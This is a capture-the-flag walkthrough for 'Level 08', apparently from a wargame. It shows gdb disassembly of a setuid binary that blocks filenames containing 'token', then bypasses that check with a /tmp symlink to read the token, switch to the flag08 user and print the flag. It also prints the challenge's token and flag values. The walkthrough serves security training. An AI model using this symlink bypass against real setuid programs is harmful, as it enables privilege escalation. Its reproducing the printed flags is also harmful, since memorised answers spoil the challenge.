# Level 08

```bash
$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```bash
$ ./level08 
./level08 [file to read]
$ ./level08 token
You may not access 'token'
```

```bash
$ gdb level08 
(gdb) disas main
Dump of assembler code for function main:
   0x080485a6 <+82>:	mov    0x1c(%esp),%eax
   0x080485aa <+86>:	add    $0x4,%eax
   0x080485ad <+89>:	mov    (%eax),%eax
   0x080485af <+91>:	movl   $0x8048793,0x4(%esp)
   0x080485b7 <+99>:	mov    %eax,(%esp)
   0x080485ba <+102>:	call   0x8048400 <strstr@plt>
   0x080485bf <+107>:	test   %eax,%eax
   0x080485c1 <+109>:	je     0x80485e9 <main+149>
   0x080485c3 <+111>:	mov    0x1c(%esp),%eax

(gdb) x/s 0x8048793
0x8048793:	 "token"
(gdb) 
```

```bash
$ ln -s /home/user/level08/token /tmp/test
$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
```

```bash
$ su flag08
Password: 
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
``